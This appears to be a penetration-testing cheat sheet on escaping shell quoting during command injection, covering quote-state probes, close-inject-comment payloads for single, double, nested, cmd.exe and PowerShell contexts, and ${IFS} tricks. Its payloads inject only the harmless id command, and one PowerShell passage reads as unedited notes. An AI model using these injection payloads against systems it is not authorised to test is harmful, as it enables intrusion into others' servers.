# Quoting — escaping the string the template wrapped you in

## The model — your input is inside someone else's command string

```
ping -c 4 '$INPUT'
convert "$INPUT" out.png
sh -c "check $INPUT done"
```

A bare `;` inside quotes is *literal data*, not a separator. The game:
close the quote, inject, absorb the trailing text.

## The quote-state discovery probe — cheapest first

Send one unbalanced quote alone and read the error:

| Send | Shell response reveals |
|---|---|
| `'` | `Syntax error: Unterminated quoted string` → wrapped in `'...'` |
| `"` | same error → wrapped in `"..."` |
| `'` then `"` separately | whichever errors first is the enclosing quote |
| `'\''` style | the error shows the exact quoting state |

`sh`/`dash` errors: `Syntax error: Unterminated quoted string`.
`bash` is the same wording. `cmd.exe` ignores unclosed quotes — silent.

## The quote-escape patterns

Wrapped in **single quotes** `'$INPUT'`:

```
';id;#'          → 'x';id;#'   — close, inject, comment tail
';id;'           → 'x';id;'    — close, inject, reopen dummy quote
';id -- #'
'$(id)'          — NO: inside single quotes $() does NOT expand
'`id`'           — NO: backticks literal inside single quotes too
```

Single quotes are total isolation in POSIX shells — you MUST close them
to inject anything.

Wrapped in **double quotes** `"$INPUT"`:

```
"$(id)"          → "x$(id)"   — $( ) EXPANDS inside double quotes! No close needed
"`id`"           → backticks expand inside double quotes too
";id;#"          → close, inject, comment
"${x}"           — parameter expansion also runs inside ""
```

Double quotes are the high-yield target — `$( )` and `` ` `` still expand,
so you don't even need to close the quote. `arithmetic $((...))` also
expands inside double quotes.

Wrapped in **backticks** `` `$INPUT` ``:

```
`$(id)`  or  `;id`   → backticks already run the inner command — just inject
```

Wrapped in `$()` — `cmd $( $INPUT )` — inject another `$(...)` or close
the paren: `127.0.0.1);id`.

## Absorbing the trailing text — `#` and beyond

Template `ping '$INPUT' -c 4`:

| Injection | Result line | Problem |
|---|---|---|
| `';id` | `ping 'x';id' -c 4'` | trailing `'` opens unclosed quote |
| `';id;#` | `ping 'x';id;#' -c 4'` | ✓ tail commented out |
| `';id;'` | `ping 'x';id;'' -c 4'` | `''` empty string arg — `id` gets `-c 4` still — mostly fine |
| `';id #` | same as `;#` | `#` needs a space or `;` before it — `id#` is a name, `id;#` is comment |
| `';id||'` | `id` output OR'd with next — messy | |

`%23` is URL-encoded `#`. In JSON bodies, raw `#` works. In GET query
strings `#` starts a fragment — encode as `%23`.

## Nested quoting — quote inside quote

Template `sh -c "run '$INPUT' done"` — input is inside single inside
double. Escapes:

```
'";id;#"'   — close single (literal '), close double with ", inject, comment
'$(id)'     — inside '...' $() does NOT expand
'";$(id);"' — close single → land inside double → $(id) expands
```

Count the quote layers: `'\''` = close-quote + escaped-quote + reopen.

## Escaped-quote reentry — `\'` in the template

If the template escaped quotes `\"$INPUT\"` — the `\"` is inside a double-
quoted context where `\` is literal? Depends: inside `"..."`, `\"` IS an
escaped quote — so `";id;#` still closes it.

## Powershell/Windows quoting — different grammar

cmd.exe:

- no single-quote semantics — `'x'` is literal characters including `'`
- `"` toggles quoted state — `";id;` closes
- `^` is the escape char — `^&` escapes `&`
- `&`, `&&`, `||`, `|` are separators (no `;`)

PowerShell:

- `';...'` single-quoted — literal, must close
- `";..."` double-quoted — `$(...)` and `` ` `` (backtick is escape!)
  still evaluate — `";$(id)` wait `$( )` in PS is subexpression — yes
  it evaluates
- `` ` `` (backtick) = escape char, `;` = separator, `&` = call operator
  (PS7+: `&&`/`||` chains)

## Multiline/quote-as-newline — `'` inside a `'`-quoted arg ends it

```
'$INPUT' where INPUT = x';${IFS}id;${IFS}echo '${IFS}
```

`'` alternates quoting state: `x` quoted, `;` outside, `${IFS}` outside
(expands to whitespace), `id` runs, `echo '` reopens for the tail.

## Special case — the template is a single command, not a script

Template `ping -c4 $INPUT` with no quoting — plain injection, no quote
work needed. Only bother with quote escapes when the quoting probe errors.

## Evidence rule

A shell syntax error quoting `sh:`/`bash:`/`dash:` is shell-boundary
evidence — record the verbatim error. `Unterminated quoted string`
proves both the shell AND the quoting state in one probe.

## Falsifiers

- neither `'` nor `"` produces a syntax error AND `$()` doesn't expand —
  the value likely never reaches a shell string

## Output to record

- the enclosing quote character determined + the working close-inject-
  comment pattern
